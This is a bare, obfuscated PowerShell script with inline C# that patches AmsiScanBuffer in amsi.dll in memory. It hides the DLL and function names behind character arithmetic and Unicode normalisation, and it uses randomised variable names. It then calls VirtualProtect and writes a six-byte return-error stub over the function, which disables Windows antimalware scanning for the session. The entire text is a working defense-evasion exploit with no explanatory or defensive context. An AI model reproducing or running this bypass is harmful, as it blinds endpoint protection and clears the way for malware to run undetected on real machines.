$wtZsF = @"
using System;
using System.Runtime.InteropServices;
public class wtZsF {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr siMiT, string ZELxIGrz4pmcratq);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr vek, UIntPtr hZvSg6ho6Jgs4_s, uint zXFyQ, out uint XddXX1D);
}
"@

Add-Type $wtZsF

$egYmiNxJhs = [wtZsF]::LoadLibrary("$([cHAR](97+16-16)+[cHAR](109+53-53)+[cHAr](115+42-42)+[cHar]([ByTE]0x69)+[cHAR]([byTe]0x2e)+[chaR]([BytE]0x64)+[CHAR]([bytE]0x6c)+[cHAR](108))")
$pFzJ_wyj3c = [wtZsF]::GetProcAddress($egYmiNxJhs, "$(('Ä'+'m'+'s'+'î'+'S'+'c'+'â'+'n'+'B'+'ù'+'f'+'f'+'è'+'r').normAlIzE([CHAr]([byTE]0x46)+[CHAR](111)+[cHAr](114)+[cHaR]([bYtE]0x6d)+[chaR](47+21)) -replace [CHar](92+49-49)+[chaR]([byte]0x70)+[ChAr]([bytE]0x7b)+[CHAr]([BYte]0x4d)+[char]([BYte]0x6e)+[CHaR]([bytE]0x7d))")
$p = 0
[wtZsF]::VirtualProtect($pFzJ_wyj3c, [uint32]5, 0x40, [ref]$p)
$CaymNWAD370grUzZSuye = "0xB8"
$qWEDmC93If1 = "0x57"
$gUhKHFvgtrXGq8 = "0x00"
$YooWKo = "0x07"
$VSb = "0x80"
$trtG = "0xC3"
$IMnZZtX4NfEE = [Byte[]] ($CaymNWAD370grUzZSuye,$qWEDmC93If1,$gUhKHFvgtrXGq8,$YooWKo,+$VSb,+$trtG)
[System.Runtime.InteropServices.Marshal]::Copy($IMnZZtX4NfEE, 0, $pFzJ_wyj3c, 6)